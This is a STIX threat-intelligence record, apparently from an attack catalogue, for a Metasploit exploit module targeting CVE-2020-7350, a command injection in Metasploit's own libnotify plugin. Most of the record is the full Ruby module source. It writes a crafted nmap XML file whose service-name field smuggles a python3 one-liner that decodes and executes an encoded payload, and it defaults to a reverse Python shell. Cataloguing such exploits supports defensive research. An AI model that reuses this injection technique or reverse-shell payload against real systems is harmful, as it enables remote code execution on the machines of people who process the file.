{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2dbd4360-a58f-4dd0-ab56-bfd9c24cbebc",
    "created": "2024-08-14T17:14:06.511781Z",
    "modified": "2024-08-14T17:14:06.511784Z",
    "name": "Metasploit Libnotify Plugin Arbitrary Command Execution",
    "description": " This module exploits a shell command injection vulnerability in the libnotify plugin. This vulnerability affects Metasploit versions 5.0.79 and earlier.  'DisclosureDate' => '2020-03-04' 'License' => GPL_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/fileformat/metasploit_libnotify_cmd_injection.rb",
            "external_id": "metasploit_libnotify_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7350"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/issues/13026"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Metasploit Libnotify Plugin Arbitrary Command Execution',\n        'Description' => %q{\n          This module exploits a shell command injection vulnerability in the\n          libnotify plugin. This vulnerability affects Metasploit versions\n          5.0.79 and earlier.\n        },\n        'DisclosureDate' => '2020-03-04',\n        'License' => GPL_LICENSE,\n        'Author' => [\n          'pasta <jaguinaga@faradaysec.com>' # Discovery and PoC\n        ],\n        'References' => [\n          [ 'CVE', '2020-7350' ],\n          [ 'URL', 'https://github.com/rapid7/metasploit-framework/issues/13026' ]\n        ],\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Payload' => {\n          'DisableNops' => true\n        },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_python'\n        },\n        'Targets' => [[ 'Automatic', {}]],\n        'Privileged' => false,\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [false, 'The file to write.', 'scan.xml']),\n      ]\n    )\n  end\n\n  def exploit\n    xml = %(<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE nmaprun>\n<nmaprun scanner=\"nmap\" args=\"nmap -P0 -oA pepito 192.168.20.121\" start=\"1583503480\" startstr=\"Fri Mar  6 11:04:40 2020\" version=\"7.60\" xmloutputversion=\"1.04\">\n<host starttime=\"1583503480\" endtime=\"1583503480\"><status state=\"up\" reason=\"user-set\" reason_ttl=\"0\"/>\n<address addr=\"192.168.20.121\" addrtype=\"ipv4\"/>\n<hostnames>\n</hostnames>\n<ports>\n<port protocol=\"tcp\" portid=\"22\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"0\"/><service name=\"ssh';python3 -c &quot;import os,base64;os.system(base64.b32decode(b'#{Rex::Text.encode_base32(payload.encoded)}'.upper()))&quot;&amp;; printf '\" method=\"table\" conf=\"3\"/></port>\n</ports>\n<times srtt=\"6174\" rttvar=\"435\" to=\"100000\"/>\n</host>\n<runstats><finished time=\"1583503480\" timestr=\"Fri Mar  6 11:04:40 2020\" elapsed=\"0.22\" summary=\"Nmap done at Fri Mar  6 11:04:40 2020; 1 IP address (1 host up) scanned in 0.22 seconds\" exit=\"success\"/><hosts up=\"1\" down=\"0\" total=\"1\"/>\n</runstats>\n</nmaprun>\n)\n\n    print_status \"Writing xml file: #{datastore['FILENAME']}\"\n    file_create xml\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}